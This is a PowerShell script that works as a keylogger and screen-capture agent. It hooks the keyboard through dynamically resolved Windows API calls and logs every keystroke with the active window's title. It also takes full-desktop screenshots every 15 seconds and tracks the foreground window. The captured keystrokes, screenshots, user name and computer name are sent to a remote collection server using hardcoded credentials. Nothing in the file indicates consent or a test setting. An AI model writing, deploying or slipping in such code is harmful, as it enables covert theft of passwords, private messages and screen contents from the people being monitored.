[CmdLetBinding(DefaultParameterSetName = "NormalRun")]
Param(
    [Parameter(Mandatory = $False, Position = 1, ParameterSetName = "NormalRun")] [string]$url = "http://10.0.0.10:8000",
    [Parameter(Mandatory = $False, Position = 2, ParameterSetName = "NormalRun")] [string]$user = "admin",
    [Parameter(Mandatory = $False, Position = 3, ParameterSetName = "NormalRun")] [string]$pwd = "admin"
)


Add-Type -AssemblyName System.Windows.Forms,System.Drawing

$uri = $url + "/data/upload/agent"
$pair = "${user}:${pwd}"

$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)

$basicAuthValue = "Basic $base64"

$headers = @{ Authorization = $basicAuthValue }


$currentComputer = $Env:Computername


$sig = @'
[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
'@

Add-Type -MemberDefinition $sig -Namespace Advapi32 -Name Util

$size = 64
$str = New-Object System.Text.StringBuilder -ArgumentList $size

[Advapi32.util]::GetUserName($str, [ref]$size) |Out-Null
$currentUser = $str.ToString()

function enrichment($data) {
    
}
function store ($data) {
    $JSON = $data | ConvertTo-Json
    $response = Invoke-WebRequest -Uri $uri -Method Post -Body $JSON -ContentType "application/json" -Headers $headers
}


function MakeScreenshot {
    
    $screens = [Windows.Forms.Screen]::AllScreens
    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum

    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)

    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

    $stream = New-Object System.IO.MemoryStream
    $bmp.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png);

    $base64String = [Convert]::ToBase64String($stream.ToArray());
    $cur = @{ image = $base64String
        type = "screen"
        user = $currentUser
        computer = $currentComputer
        time = Get-Date -Format "dd.MM.yyyy HH:mm:ss"}
    store($cur)
    $graphics.Dispose()
    $bmp.Dispose()
}

Add-Type @" 
  using System; 
  using System.Runtime.InteropServices; 
  public class UserWindows { 
    [DllImport("user32.dll")] 
    public static extern IntPtr GetForegroundWindow(); 
} 
"@ 


$global:activeWindowHandle=0
function TakeActiveWindow {
    try { 
        $ActiveHandle = [UserWindows]::GetForegroundWindow() 
        if ($global:activeWindowHandle -ne $ActiveHandle) {
            $global:activeWindowHandle = $ActiveHandle
            $Process = Get-Process | ? {$_.MainWindowHandle -eq $activeHandle} 
            $cur = $Process | Select ProcessName, @{Name="AppTitle";Expression= {($_.MainWindowTitle)}} 
            $data = @{"process" = $cur.ProcessName
             type = "window"
             title = $cur.AppTitle
             user = $currentUser
             computer = $currentComputer
             time = Get-Date -Format "dd.MM.yyyy HH:mm:ss"}
            $JSON = $data | ConvertTo-Json
            $response = Invoke-WebRequest -Uri $uri -Method Post -Body $JSON -ContentType "application/json" -Headers $headers
        }
       
    } catch { 
        Write-Error "Failed to get active Window details. More Info: $_" 
    }
}

$global:keyboardAccum = ""
$global:keyboardWindowTitle = ""

function local:Get-DelegateType {
    Param (
        [OutputType([Type])]
    
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
    
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

    $TypeBuilder.CreateType()
}


function local:Get-ProcAddress {
    Param (
        [OutputType([IntPtr])]

        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $Module,
    
        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

    # Return the address of the function
    $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

#region Imports

[void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')

# SetWindowsHookEx
$SetWindowsHookExAddr = Get-ProcAddress user32.dll SetWindowsHookExA
$SetWindowsHookExDelegate = Get-DelegateType @([Int32], [MulticastDelegate], [IntPtr], [Int32]) ([IntPtr])
$SetWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetWindowsHookExAddr, $SetWindowsHookExDelegate)

# CallNextHookEx
$CallNextHookExAddr = Get-ProcAddress user32.dll CallNextHookEx
$CallNextHookExDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr], [IntPtr]) ([IntPtr])
$CallNextHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CallNextHookExAddr, $CallNextHookExDelegate)

# UnhookWindowsHookEx
$UnhookWindowsHookExAddr = Get-ProcAddress user32.dll UnhookWindowsHookEx
$UnhookWindowsHookExDelegate = Get-DelegateType @([IntPtr]) ([Void])
$UnhookWindowsHookEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UnhookWindowsHookExAddr, $UnhookWindowsHookExDelegate)

# PeekMessage
$PeekMessageAddr = Get-ProcAddress user32.dll PeekMessageA
$PeekMessageDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([Void])
$PeekMessage = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PeekMessageAddr, $PeekMessageDelegate)

# GetAsyncKeyState
$GetAsyncKeyStateAddr = Get-ProcAddress user32.dll GetAsyncKeyState
$GetAsyncKeyStateDelegate = Get-DelegateType @([Windows.Forms.Keys]) ([Int16])
$GetAsyncKeyState = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAsyncKeyStateAddr, $GetAsyncKeyStateDelegate)

# GetForegroundWindow
$GetForegroundWindowAddr = Get-ProcAddress user32.dll GetForegroundWindow
$GetForegroundWindowDelegate = Get-DelegateType @() ([IntPtr])
$GetForegroundWindow = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetForegroundWindowAddr, $GetForegroundWindowDelegate)

# GetWindowText
$GetWindowTextAddr = Get-ProcAddress user32.dll GetWindowTextA
$GetWindowTextDelegate = Get-DelegateType @([IntPtr], [Text.StringBuilder], [Int32]) ([Void])
$GetWindowText = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetWindowTextAddr, $GetWindowTextDelegate)

# GetModuleHandle
$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
$GetModuleHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)

#endregion Imports

$CallbackScript = {
    Param (
        [Parameter()]
        [Int32]$Code,

        [Parameter()]
        [IntPtr]$wParam,

        [Parameter()]
        [IntPtr]$lParam
    )

    $Keys = [Windows.Forms.Keys]

    $MsgType = $wParam.ToInt32()

    # Process WM_KEYDOWN & WM_SYSKEYDOWN messages
    if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {
    
        $hWindow = $GetForegroundWindow.Invoke()

        $ShiftState = $GetAsyncKeyState.Invoke($Keys::ShiftKey)
        if (($ShiftState -band 0x8000) -eq 0x8000) { $Shift = $true }
        else { $Shift = $false }

        $Caps = [Console]::CapsLock

        # Read virtual-key from buffer
        $vKey = [Windows.Forms.Keys][Runtime.InteropServices.Marshal]::ReadInt32($lParam)

        # Parse virtual-key
        if ($vKey -gt 64 -and $vKey -lt 91) { # Alphabet characters
            if ($Shift -xor $Caps) { $Key = $vKey.ToString() }
            else { $Key = $vKey.ToString().ToLower() }
        }
        elseif ($vKey -ge 96 -and $vKey -le 111) { # Number pad characters
            switch ($vKey.value__) {
                96 { $Key = '0' }
                97 { $Key = '1' }
                98 { $Key = '2' }
                99 { $Key = '3' }
                100 { $Key = '4' }
                101 { $Key = '5' }
                102 { $Key = '6' }
                103 { $Key = '7' }
                104 { $Key = '8' }
                105 { $Key = '9' }
                106 { $Key = "*" }
                107 { $Key = "+" }
                108 { $Key = "|" }
                109 { $Key = "-" }
                110 { $Key = "." }
                111 { $Key = "/" }
            }
        }
        elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {                      
            if ($Shift) {                           
                switch ($vKey.value__) { # Shiftable characters
                    48 { $Key = ')' }
                    49 { $Key = '!' }
                    50 { $Key = '@' }
                    51 { $Key = '#' }
                    52 { $Key = '$' }
                    53 { $Key = '%' }
                    54 { $Key = '^' }
                    55 { $Key = '&' }
                    56 { $Key = '*' }
                    57 { $Key = '(' }
                    186 { $Key = ':' }
                    187 { $Key = '+' }
                    188 { $Key = '<' }
                    189 { $Key = '_' }
                    190 { $Key = '>' }
                    191 { $Key = '?' }
                    192 { $Key = '~' }
                    219 { $Key = '{' }
                    220 { $Key = '|' }
                    221 { $Key = '}' }
                    222 { $Key = '<Double Quotes>' }
                }
            }
            else {                           
                switch ($vKey.value__) {
                    48 { $Key = '0' }
                    49 { $Key = '1' }
                    50 { $Key = '2' }
                    51 { $Key = '3' }
                    52 { $Key = '4' }
                    53 { $Key = '5' }
                    54 { $Key = '6' }
                    55 { $Key = '7' }
                    56 { $Key = '8' }
                    57 { $Key = '9' }
                    186 { $Key = ';' }
                    187 { $Key = '=' }
                    188 { $Key = ',' }
                    189 { $Key = '-' }
                    190 { $Key = '.' }
                    191 { $Key = '/' }
                    192 { $Key = '`' }
                    219 { $Key = '[' }
                    220 { $Key = '\' }
                    221 { $Key = ']' }
                    222 { $Key = '<Single Quote>' }
                }
            }
        }
        else {
            switch ($vKey) {
                $Keys::F1  { $Key = '<F1>' }
                $Keys::F2  { $Key = '<F2>' }
                $Keys::F3  { $Key = '<F3>' }
                $Keys::F4  { $Key = '<F4>' }
                $Keys::F5  { $Key = '<F5>' }
                $Keys::F6  { $Key = '<F6>' }
                $Keys::F7  { $Key = '<F7>' }
                $Keys::F8  { $Key = '<F8>' }
                $Keys::F9  { $Key = '<F9>' }
                $Keys::F10 { $Key = '<F10>' }
                $Keys::F11 { $Key = '<F11>' }
                $Keys::F12 { $Key = '<F12>' }
    
                $Keys::Snapshot    { $Key = '<Print Screen>' }
                $Keys::Scroll      { $Key = '<Scroll Lock>' }
                $Keys::Pause       { $Key = '<Pause/Break>' }
                $Keys::Insert      { $Key = '<Insert>' }
                $Keys::Home        { $Key = '<Home>' }
                $Keys::Delete      { $Key = '<Delete>' }
                $Keys::End         { $Key = '<End>' }
                $Keys::Prior       { $Key = '<Page Up>' }
                $Keys::Next        { $Key = '<Page Down>' }
                $Keys::Escape      { $Key = '<Esc>' }
                $Keys::NumLock     { $Key = '<Num Lock>' }
                $Keys::Capital     { $Key = '<Caps Lock>' }
                $Keys::Tab         { $Key = '<Tab>' }
                $Keys::Back        { $Key = '<Backspace>' }
                $Keys::Enter       { $Key = '<Enter>' }
                $Keys::Space       { $Key = '< >' }
                $Keys::Left        { $Key = '<Left>' }
                $Keys::Up          { $Key = '<Up>' }
                $Keys::Right       { $Key = '<Right>' }
                $Keys::Down        { $Key = '<Down>' }
                $Keys::LMenu       { $Key = '<Alt>' }
                $Keys::RMenu       { $Key = '<Alt>' }
                $Keys::LWin        { $Key = '<Windows Key>' }
                $Keys::RWin        { $Key = '<Windows Key>' }
                $Keys::LShiftKey   { $Key = '<Shift>' }
                $Keys::RShiftKey   { $Key = '<Shift>' }
                $Keys::LControlKey { $Key = '<Ctrl>' }
                $Keys::RControlKey { $Key = '<Ctrl>' }
            }
        }

        # Get foreground window's title
        $Title = New-Object Text.Stringbuilder 256
        $GetWindowText.Invoke($hWindow, $Title, $Title.Capacity)
        $title = $Title.ToString()
        if ($title -eq $global:keyboardWindowTitle) {
            $global:keyboardAccum += $Key
        } elseif ($global:keyboardWindowTitle -eq "") {
            $global:keyboardAccum = $Key
            $global:keyboardWindowTitle = $title
        } else {
            $data = @{"process" = $cur.ProcessName
            type = "keyboard"
            title = $global:keyboardWindowTitle
            user = $currentUser
            computer = $currentComputer
            string= $global:keyboardAccum
            time = Get-Date -Format "dd.MM.yyyy HH:mm:ss"}

            $global:keyboardAccum = $Key
            $global:keyboardWindowTitle = $title

            $JSON = $data | ConvertTo-Json
            $response = Invoke-WebRequest -Uri $uri -Method Post -Body $JSON -ContentType "application/json" -Headers $headers
        }
    }
    return $CallNextHookEx.Invoke([IntPtr]::Zero, $Code, $wParam, $lParam)
}


$Delegate = Get-DelegateType @([Int32], [IntPtr], [IntPtr]) ([IntPtr])
$Callback = $CallbackScript -as $Delegate
    
# Get handle to PowerShell for hook
$PoshModule = (Get-Process -Id $PID).MainModule.ModuleName
$ModuleHandle = $GetModuleHandle.Invoke($PoshModule)

# Set WM_KEYBOARD_LL hook
$Hook = $SetWindowsHookEx.Invoke(0xD, $Callback, $ModuleHandle, 0)



$sw = [diagnostics.stopwatch]::StartNew()
while ($True){
    MakeScreenshot
    TakeActiveWindow
    start-sleep -seconds 15
}

$UnhookWindowsHookEx.Invoke($Hook)

